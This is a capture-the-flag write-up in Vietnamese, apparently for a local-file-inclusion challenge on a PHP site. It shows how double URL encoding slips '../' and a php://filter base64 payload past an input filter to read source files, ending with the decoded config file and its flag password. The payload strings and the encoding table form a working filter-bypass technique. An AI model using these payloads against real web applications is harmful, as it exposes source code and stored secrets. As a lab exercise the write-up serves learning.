![image](https://user-images.githubusercontent.com/125866921/229975950-d1e01a3a-b055-4bad-80a0-707188cc83e4.png)

  - Ở phần url tiếp tục xuất hiện các tham số điều hướng, do đó có thể web này đã dính lỗi RFI/LFI.  

  - Thử lại ``../`` như ở phần bài ```Local File Inclusion``` nhưng nó không còn hoạt động nữa, có thể là do web đã lọc các kí tự.  

Để làm được chall này mình đã thử tham khảo nguồn sau:  

    https://owasp.org/www-community/Double_Encoding  
    
Các kí tự thường dùng sau khi được encode và double encode sẽ như sau:  

    : => %3A => %253A

    / => %2F => %252F

    . =>%2E => %252E

    – => 2D => %252D

    = => 3D => %253D
    
Đầu tiên mình thử encode các kí tự ``../`` thành ``%2E%2E%2f`` theo URLencode và thử lại vào trong tham số page. Tuy nhiên vẫn như cũ bị bật ra thông báo như trên.  

![image](https://user-images.githubusercontent.com/125866921/229976853-f3bd9f62-c0bf-4dba-82af-2028fc2be307.png)

Do đề bài là double encoding. Thử encode tiếp 1 lần nữa xem sao, như vậy ``%2E%2E%2f`` thành ``%252E%252E%252F``. Và nó đã hoạt động.  

Tiếp theo chúng ta sẽ sử dụng ``php://filte`` với base64 encoding. Payload sẽ thế này:  

    php://filter/convert.base64-encode/resource=cv
    
 Sau 2 lần encode thì url của nó sẽ trông như thế này:  
 
    php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dcv  
    
  - Tiếp tục đổi ``.`` thành ``%252E``  

  - ``-`` thành ``%252D``

![image](https://user-images.githubusercontent.com/125866921/229978101-e75089b4-15a3-4724-9432-7872ce3b3e8c.png)

Ta nhận được:  
    
    PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIENWPC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8Pz0gJGNvbmZbJ2dsb2JhbF9zdHlsZSddID8+CiAgICA8bmF2PgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1ob21lIj5Ib21lPC9hPgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jdiIgY2xhc3M9ImFjdGl2ZSI+Q1Y8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWNvbnRhY3QiPkNvbnRhY3Q8L2E+CiAgICA8L25hdj4KICAgIDxoMT48Pz0gJGNvbmZbJ2NvbnRhY3QnXVsnZmlyc3RuYW1lJ10gPz4gPD89ICRjb25mWydjb250YWN0J11bJ2xhc3RuYW1lJ10gPz48L2gxPgogICAgPGgzPlByb2Zlc3Npb25hbCBkb2VyPC9oMz4KICAgIDw/PSAkY29uZlsnY3YnXVsnZ2VuZGVyJ10gPyAiTWFsZSIgOiAiRmVtYWxlIiA/Pjxicj4KICAgIDw/PSBkYXRlKCdZL20vZCcsICRjb25mWydjdiddWydiaXJ0aCddKSA/PiAoPD89IGRhdGUoJ1knKS1kYXRlKCdZJywgJGNvbmZbJ2N2J11bJ2JpcnRoJ10pID8+KQogICAgPD9waHAKICAgICAgZm9yZWFjaCAoJGNvbmZbJ2N2J11bJ2pvYnMnXSBhcyAkam9iKSB7CiAgICA/PgogICAgICA8ZGl2IGNsYXNzPSJqb2IiPgogICAgICAgIDxoND48Pz0gJGpvYlsndGl0bGUnXSA/PiAtIDxzcGFuIGNsYXNzPSJkYXRlIj48Pz0gJGpvYlsnZGF0ZSddID8+PC9zcGFuPjwvaDQ+CiAgICAgIDwvZGl2PgogICAgPD9waHAKICAgICAgfQogICAgPz4KICA8L2JvZHk+CjwvaHRtbD4K
    
Encode những dòng trên bằng base64 ta được:  

    <?php include("conf.inc.php"); ?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <title>J. Smith - CV</title>
    </head>
    <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home">Home</a>
      <a href="index.php?page=cv" class="active">CV</a>
      <a href="index.php?page=contact">Contact</a>
    </nav>
    <h1><?= $conf['contact']['firstname'] ?> <?= $conf['contact']['lastname'] ?></h1>
    <h3>Professional doer</h3>
    <?= $conf['cv']['gender'] ? "Male" : "Female" ?><br>
    <?= date('Y/m/d', $conf['cv']['birth']) ?> (<?= date('Y')-date('Y', $conf['cv']['birth']) ?>)
    <?php
      foreach ($conf['cv']['jobs'] as $job) {
    ?>
      <div class="job">
        <h4><?= $job['title'] ?> - <span class="date"><?= $job['date'] ?></span></h4>
      </div>
    <?php
      }
    ?>
    </body>
    </html>

``<?php include("conf.inc.php");`` ?> Rất có thể password nằm trong file conf.inc.php.  

```Lưu ý``` khi ta nhập tên file vào sau tham số page thì nó tự động thêm đuôi .inc.php. Như vậy ta chỉ cần thay cv thành conf là ok. Ta tiếp tục được 1 đoạn mã được encode bởi base64. decode nó ra là được  

    <?php
    $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
    "cv"          => [
      "gender"      => true,
      "birth"       => 441759600,
      "jobs"        => [
        [
          "title"     => "Coffee developer @Megaupload",
          "date"      => "01/2010"
        ],
        [
          "title"     => "Bed tester @YourMom's",
          "date"      => "03/2011"
        ],
        [
          "title"     => "Beer drinker @NearestBar",
          "date"      => "10/2014"
        ]
      ]
    ],
    "contact"       => [
      "firstname"     => "John",
      "lastname"      => "Smith",
      "phone"         => "01 33 71 00 01",
      "mail"          => "john.smith@thegame.com"
    ],
    "global_style"  => '<style media="screen">
      body{
        background: rgb(231, 231, 231);
        font-family: Tahoma,Verdana,Segoe,sans-serif;
        font-size: 14px;
      }
      div#main{
        padding: 20px 10px;
      }
      nav{
        border: 1px solid rgb(101, 101, 101);
        font-size: 0;
      }
      nav a{
        font-size: 14px;
        padding: 5px 10px;
        box-sizing: border-box;
        display: inline-block;
        text-decoration: none;
        color: #555;
      }
      nav a.active{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      nav a:hover{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      h2{
        margin-top:0;
      }
      </style>'
    ];

Đọc phần decode:  

    password: Th1sIsTh3Fl4g!
